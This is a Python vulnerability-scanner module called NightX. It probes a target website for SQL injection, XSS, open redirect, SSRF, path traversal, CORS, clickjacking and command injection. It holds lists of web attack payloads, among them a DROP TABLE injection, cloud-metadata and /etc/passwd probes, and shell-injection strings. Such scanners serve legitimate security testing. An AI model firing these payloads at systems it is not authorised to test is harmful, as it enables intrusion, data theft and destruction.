#!/usr/bin/env python3
"""NightX — Vulnerability Scanner Module"""
import asyncio, re, urllib.parse
from typing import Dict, List, Optional
from bs4 import BeautifulSoup
import httpx
from rich.console import Console
from rich.table import Table
from rich import box

console = Console()

SQLI_PAYLOADS = [
    ("'","error"),("''","error"),("' OR '1'='1","bypass"),
    ("' OR 1=1--","bypass"),("1 UNION SELECT NULL--","union"),
    ("1 UNION SELECT NULL,NULL--","union"),("'; DROP TABLE users--","error"),
    ("1' AND SLEEP(5)--","timebased"),
]
SQL_ERRORS = ["sql syntax","mysql_fetch","ora-","odbc","sqlite3","postgresql",
              "unclosed quotation","you have an error in your sql","warning: mysql",
              "sqlstate","division by zero","invalid query"]
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>","<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>","'><script>alert('XSS')</script>",
    "\"<script>alert('XSS')</script>","{{7*7}}","${7*7}",
]
REDIRECT_PARAMS  = ["url","redirect","return","next","goto","target","redir","link","forward","continue","callback"]
REDIRECT_PAYLOADS = ["https://evil.com","//evil.com","///evil.com","http://evil.com"]
SSRF_PARAMS      = ["url","uri","link","src","source","dest","image","fetch","callback","endpoint","proxy"]
SSRF_PAYLOADS    = ["http://127.0.0.1","http://localhost","http://169.254.169.254",
                    "http://169.254.169.254/latest/meta-data/","file:///etc/passwd"]
PATH_PAYLOADS    = ["../../../etc/passwd","../../etc/passwd","..%2F..%2F..%2Fetc%2Fpasswd",
                    "....//....//etc/passwd","..\\..\\windows\\win.ini"]
CMDI_PAYLOADS    = ["; whoami","| whoami","& whoami","&& whoami","$(whoami)","`whoami`"]

class VulnerabilityScanner:
    def __init__(self, target: str, threads: int = 10, verbose: bool = False):
        self.target   = target.rstrip("/")
        self.threads  = threads
        self.verbose  = verbose
        self.findings: List[Dict] = []
        self.sem = asyncio.Semaphore(threads)
        self.ua  = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120"}

    def _add(self, vtype, severity, url, param, payload, detail):
        self.findings.append({"type":vtype,"severity":severity,"url":url,
                               "parameter":param,"payload":payload,"detail":detail})
        c = {"CRITICAL":"bold red","HIGH":"red","MEDIUM":"yellow","LOW":"cyan"}.get(severity,"white")
        console.print(f"  [{c}]💥 [{severity}] {vtype}[/{c}] — {param} — {detail[:60]}")

    async def _get(self, url: str, timeout: int = 8) -> Optional[httpx.Response]:
        async with self.sem:
            try:
                async with httpx.AsyncClient(timeout=timeout, verify=False,
                    follow_redirects=False, headers=self.ua) as c:
                    return await c.get(url)
            except Exception:
                return None

    async def _post(self, url: str, data: Dict) -> Optional[httpx.Response]:
        async with self.sem:
            try:
                async with httpx.AsyncClient(timeout=8, verify=False,
                    follow_redirects=False, headers=self.ua) as c:
                    return await c.post(url, data=data)
            except Exception:
                return None

    async def _extract_params(self) -> List:
        params = []
        resp = await self._get(self.target)
        if resp and resp.text:
            try:
                soup = BeautifulSoup(resp.text, "html.parser")
                for form in soup.find_all("form"):
                    act    = form.get("action","")
                    method = form.get("method","get").upper()
                    furl   = urllib.parse.urljoin(self.target, act)
                    for inp in form.find_all(["input","textarea","select"]):
                        name = inp.get("name")
                        if name and inp.get("type") not in ["hidden","submit","button"]:
                            params.append((method, furl, name))
            except Exception:
                pass
        for p in ["id","q","search","s","page","cat","name","user","item","query"]:
            params.append(("GET", f"{self.target}/?{p}=test", p))
        return params

    async def test_sqli(self):
        console.print("\n  [bold]Testing SQL Injection...[/bold]")
        params = await self._extract_params()
        tasks  = []
        for method, url, param in params:
            for payload, ptype in SQLI_PAYLOADS[:6]:
                tasks.append(self._sqli_one(method, url, param, payload))
        await asyncio.gather(*tasks)

    async def _sqli_one(self, method, url, param, payload):
        if method == "GET":
            r = await self._get(f"{url.split('?')[0]}?{param}={urllib.parse.quote(payload)}")
        else:
            r = await self._post(url, {param: payload})
        if r and r.text:
            body = r.text.lower()
            for err in SQL_ERRORS:
                if err in body:
                    self._add("SQL Injection","CRITICAL",url,param,payload,f"SQL error: {err}")
                    return

    async def test_xss(self):
        console.print("\n  [bold]Testing Cross-Site Scripting (XSS)...[/bold]")
        params = await self._extract_params()
        tasks  = []
        for method, url, param in params:
            for payload in XSS_PAYLOADS[:5]:
                tasks.append(self._xss_one(method, url, param, payload))
        await asyncio.gather(*tasks)

    async def _xss_one(self, method, url, param, payload):
        if method == "GET":
            r = await self._get(f"{url.split('?')[0]}?{param}={urllib.parse.quote(payload)}")
        else:
            r = await self._post(url, {param: payload})
        if r and r.text and payload in r.text:
            self._add("Reflected XSS","HIGH",url,param,payload,"Payload reflected unencoded")

    async def test_open_redirect(self):
        console.print("\n  [bold]Testing Open Redirect...[/bold]")
        tasks = []
        for param in REDIRECT_PARAMS:
            for payload in REDIRECT_PAYLOADS[:3]:
                url = f"{self.target}/?{param}={urllib.parse.quote(payload)}"
                tasks.append(self._redirect_one(url, param, payload))
        await asyncio.gather(*tasks)

    async def _redirect_one(self, url, param, payload):
        r = await self._get(url)
        if r and r.status_code in [301,302,303,307,308]:
            loc = r.headers.get("location","")
            if "evil.com" in loc or loc.startswith("//"):
                self._add("Open Redirect","MEDIUM",url,param,payload,f"Redirects to: {loc}")

    async def test_ssrf(self):
        console.print("\n  [bold]Testing SSRF...[/bold]")
        tasks = []
        for param in SSRF_PARAMS:
            for payload in SSRF_PAYLOADS[:3]:
                url = f"{self.target}/?{param}={urllib.parse.quote(payload)}"
                tasks.append(self._ssrf_one(url, param, payload))
        await asyncio.gather(*tasks)

    async def _ssrf_one(self, url, param, payload):
        r = await self._get(url, timeout=6)
        if r and r.text:
            for indicator in ["ami-id","instance-id","root:x:0:0","redis_version","[extensions]"]:
                if indicator.lower() in r.text.lower():
                    self._add("SSRF","CRITICAL",url,param,payload,f"Internal content: {indicator}")
                    return

    async def test_path_traversal(self):
        console.print("\n  [bold]Testing Path Traversal...[/bold]")
        tasks = []
        for param in ["file","path","page","include","load","template","view"]:
            for payload in PATH_PAYLOADS[:4]:
                url = f"{self.target}/?{param}={urllib.parse.quote(payload)}"
                tasks.append(self._path_one(url, param, payload))
        await asyncio.gather(*tasks)

    async def _path_one(self, url, param, payload):
        r = await self._get(url)
        if r and r.text:
            if "root:x:0:0" in r.text or "[extensions]" in r.text:
                self._add("Path Traversal","CRITICAL",url,param,payload,"System file content found")

    async def test_cors(self):
        console.print("\n  [bold]Testing CORS Misconfiguration...[/bold]")
        try:
            async with httpx.AsyncClient(timeout=8, verify=False, headers=self.ua) as c:
                r = await c.get(self.target, headers={"Origin":"https://evil.com"})
                acao = r.headers.get("access-control-allow-origin","")
                acac = r.headers.get("access-control-allow-credentials","false")
                if acao in ["https://evil.com","*"]:
                    sev = "HIGH" if acac.lower()=="true" else "MEDIUM"
                    self._add("CORS Misconfiguration",sev,self.target,"Origin","https://evil.com",
                              f"ACAO: {acao}, ACAC: {acac}")
        except Exception:
            pass

    async def test_clickjacking(self):
        console.print("\n  [bold]Testing Clickjacking...[/bold]")
        r = await self._get(self.target)
        if r:
            xfo = r.headers.get("x-frame-options","")
            csp = r.headers.get("content-security-policy","")
            if not xfo and "frame-ancestors" not in csp.lower():
                self._add("Clickjacking","MEDIUM",self.target,"X-Frame-Options","Missing",
                          "Page can be embedded in iframe")

    async def test_cmdi(self):
        console.print("\n  [bold]Testing Command Injection...[/bold]")
        tasks = []
        for param in ["cmd","exec","command","run","ping","host","ip"]:
            for payload in CMDI_PAYLOADS[:3]:
                url = f"{self.target}/?{param}={urllib.parse.quote(payload)}"
                tasks.append(self._cmdi_one(url, param, payload))
        await asyncio.gather(*tasks)

    async def _cmdi_one(self, url, param, payload):
        r = await self._get(url)
        if r and r.text:
            for indicator in ["uid=","gid=","bin/bash","root:","drwxr"]:
                if indicator in r.text:
                    self._add("Command Injection","CRITICAL",url,param,payload,f"Command output: {indicator}")
                    return

    async def scan_all(self) -> List[Dict]:
        console.print(f"\n[bold cyan]💥 Vulnerability Scanner:[/bold cyan] [white]{self.target}[/white]")
        await self.test_sqli()
        await self.test_xss()
        await self.test_open_redirect()
        await self.test_ssrf()
        await self.test_path_traversal()
        await self.test_cors()
        await self.test_clickjacking()
        await self.test_cmdi()
        self._print_summary()
        return self.findings

    def _print_summary(self):
        console.print()
        if not self.findings:
            console.print("[green]✅ No vulnerabilities detected[/green]")
            return
        t = Table(title=f"Vulnerabilities Found ({len(self.findings)})",
                  box=box.ROUNDED, border_style="red", show_lines=True)
        t.add_column("Type",      style="cyan",  min_width=25)
        t.add_column("Severity",  justify="center")
        t.add_column("Parameter", style="white")
        t.add_column("Detail",    style="dim")
        for f in sorted(self.findings, key=lambda x: {"CRITICAL":0,"HIGH":1,"MEDIUM":2,"LOW":3}.get(x["severity"],4)):
            sc = {"CRITICAL":"bold red","HIGH":"red","MEDIUM":"yellow","LOW":"cyan"}.get(f["severity"],"white")
            t.add_row(f["type"],f"[{sc}]{f['severity']}[/{sc}]",f.get("parameter","-"),f.get("detail","")[:45])
        console.print(t)
